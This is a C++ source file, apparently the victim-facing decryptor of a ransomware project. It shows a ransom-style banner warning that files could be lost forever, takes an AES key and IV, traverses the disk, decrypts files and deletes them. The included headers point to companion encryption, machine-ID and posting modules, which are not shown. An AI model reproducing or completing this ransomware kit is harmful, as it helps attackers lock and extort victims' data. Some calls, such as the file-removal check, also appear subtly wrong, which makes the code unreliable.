#include "cryptFile.h"
#include "traversal.h"
#include "post.h"
#include "pcID.h"
#include <cstdio>

using namespace std;

int main(int argc, char* argv[])
{
	// decrypt files
    // Declairations
    crypt_data* dedata = new crypt_data;
    string hexkey;
    string hexiv;
    string cmd;
    // Print ui
    cout << "*******************************************************************************"<<endl;
    cout << "*    *****      *    *       *  ******       *****   ******  *       ******   *"<<endl;
    cout << "*   *          * *    *     *   *           *        *       *       *        *"<<endl;
    cout << "*    *****    * * *    *   *    ******       *****   ******  *       ******   *"<<endl;
    cout << "*         *  *     *    * *     *                 *  *       *       *        *"<<endl;
    cout << "*    *****  *       *    *      ******       *****   ******  ******  *        *"<<endl;
    cout << "*******************************************************************************"<<endl;
    cout << "\n";
    cout << "*******************************************************************************"<<endl;
    cout << "*                 Please Follow our guide to decrypt your files !             *"<<endl;
    cout << "*                    Be careful, or you'd lose them forever  !                *"<<endl;
    cout << "*                                    Good Luck !                              *"<<endl;
    cout << "*******************************************************************************"<<endl;
    cout << endl;
    cout << "+------------------------------- Input key with iv ----------------------------"<<endl;
    while (true) {
        cout << "| Please enter your aes key in hex-code (notice: the lenght should be 32)"<<endl;
        cin >> hexkey;
        cout << "| Please enter your aes iv in hex-code (notice: the lenght should be 32)"<<endl;
        cin >> hexiv;
        if ((hexkey.size() == 32)&&(hexiv.size() == 32)){
            cout << "# Please verify the key and iv you input. "<<endl;
            cout << "+----------------------------------+----------------------------------+"<<endl;
            cout << "|              AES KEY             |             AES IV               |"<<endl;
            cout << "+----------------------------------+----------------------------------+"<<endl;
            cout << "| "<<hexkey<<" | "<<hexiv<<" |"<<endl;
            cout << "+----------------------------------+----------------------------------+"<<endl;
            cout << "| Are you sure to continue: (yes/no)                                  |"<<endl;
            cin >> cmd;
            if (cmd=="yes") break;
        } else {
            cout << "| Your inputs are wrong! Be careful !!!"<<endl;
        }
    }
    cout << "+-------------------------------- Start decrpting ----------------------------"<<endl;
    dedata->hexKey = hexkey;
    dedata->hexIV = hexiv;
	vector<string> de_filePaths;
    Traversal(de_filePaths,false);
    hex_to_byte_key(dedata);
	cout << "Start decrpt a file...\n";
    for (int i=0; i<de_filePaths.size(); i++){
        cout<<"The file path is : "<<de_filePaths[i]<<endl;
        decrypt(dedata, de_filePaths[i]);
        cout<< "Successfully decrypt, next remove...\n";
        if (remove(de_filePaths[i])==1) cout<<"Successfully remove\n";
    }
    cout << "Finish all decrypt\n";
    cout << "Congratulations!\n";
    return 0;
}